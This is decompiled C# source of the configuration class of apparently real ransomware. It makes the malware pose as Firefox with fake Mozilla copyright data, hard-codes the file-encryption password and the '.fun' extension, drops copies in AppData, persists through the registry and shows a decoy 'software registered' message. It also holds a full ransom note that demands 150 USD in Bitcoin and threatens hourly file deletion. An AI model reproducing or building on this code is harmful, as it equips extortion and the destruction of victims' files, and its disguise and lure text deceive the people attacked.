using System;
using System.IO;
using Main.Tools;

namespace Main;

internal static class Config
{
	internal enum StartModeType
	{
		Debug,
		ErrorMessage,
		NothingHappens,
		DeleteItself
	}

	internal const string AssemblyProdutAndTitle = "Firefox";

	internal const string AssemblyCopyright = "Copyright 1999-2012 Firefox and Mozzilla developers. All rights reserved.";

	internal const string AssemblyVersion = "37.0.2.5583";

	internal const string EncryptionFileExtension = ".fun";

	internal const int MaxFilesizeToEncryptInBytes = 10000000;

	internal const string EncryptionPassword = "OoIsAwwF23cICQoLDA0ODe==";

	internal static StartModeType StartMode;

	internal static string ErrorMessage;

	internal static string ErrorTitle;

	internal static Windows.StartupMethodType StartupMethod;

	internal static string TempExeRelativePath;

	internal static string TempExePath;

	internal static string FinalExeRelativePath;

	internal static string FinalExePath;

	internal static string WorkFolderRelativePath;

	internal static string WorkFolderPath;

	internal static bool OnlyRunAfterSysRestart;

	internal static DateTime ActiveAfterDateTime;

	internal static bool Activated;

	internal static int TimerActivateCheckerInterval;

	internal static string WelcomeMessage;

	internal static string TaskMessage;

	internal static int RansomUsd;

	static Config()
	{
		Activated = false;
		TimerActivateCheckerInterval = 6000;
		string path = Config.smethod_0(Environment.SpecialFolder.ApplicationData);
		string path2 = Config.smethod_0(Environment.SpecialFolder.LocalApplicationData);
		StartMode = StartModeType.ErrorMessage;
		ActiveAfterDateTime = new DateTime(2016, 4, 1);
		ErrorMessage = "Congratulations. Your software has been registered. Confirmation code 994759" + Environment.NewLine + "Email us this code in the chat to active your software. It can take up to 48 hours.";
		ErrorTitle = "Thank you";
		StartupMethod = Windows.StartupMethodType.Registry;
		TempExeRelativePath = "Drpbx\\drpbx.exe";
		FinalExeRelativePath = "Frfx\\firefox.exe";
		FinalExePath = Path.Combine(path, FinalExeRelativePath);
		TempExePath = Path.Combine(path2, TempExeRelativePath);
		WorkFolderRelativePath = "System32Work\\";
		WorkFolderPath = Path.Combine(path, WorkFolderRelativePath);
		if (!Directory.Exists(WorkFolderPath))
		{
			Directory.CreateDirectory(WorkFolderPath);
		}
		OnlyRunAfterSysRestart = false;
		WelcomeMessage = "Your computer files have been encrypted. Your photos, videos, documents, etc...." + Environment.NewLine + "But, don't worry! I have not deleted them, yet." + Environment.NewLine + "You have 24 hours to pay 150 USD in Bitcoins to get the decryption key." + Environment.NewLine + "Every hour files will be deleted. Increasing in amount every time." + Environment.NewLine + "After 72 hours all that are left will be deleted." + Environment.NewLine + Environment.NewLine + "If you do not have bitcoins Google the website localbitcoins." + Environment.NewLine + "Purchase 150 American Dollars worth of Bitcoins or .4 BTC. The system will accept either one." + Environment.NewLine + "Send to the Bitcoins address specified." + Environment.NewLine + "Within two minutes of receiving your payment your computer will receive the decryption key and return to normal." + Environment.NewLine + "Try anything funny and the computer has several safety measures to delete your files." + Environment.NewLine + "As soon as the payment is received the crypted files will be returned to normal." + Environment.NewLine + Environment.NewLine + "       Thank you        ";
		RansomUsd = 150;
		TaskMessage = "Please, send $" + RansomUsd + " worth of Bitcoin here:";
	}

	static string smethod_0(Environment.SpecialFolder specialFolder_0)
	{
		return Environment.GetFolderPath(specialFolder_0);
	}
}
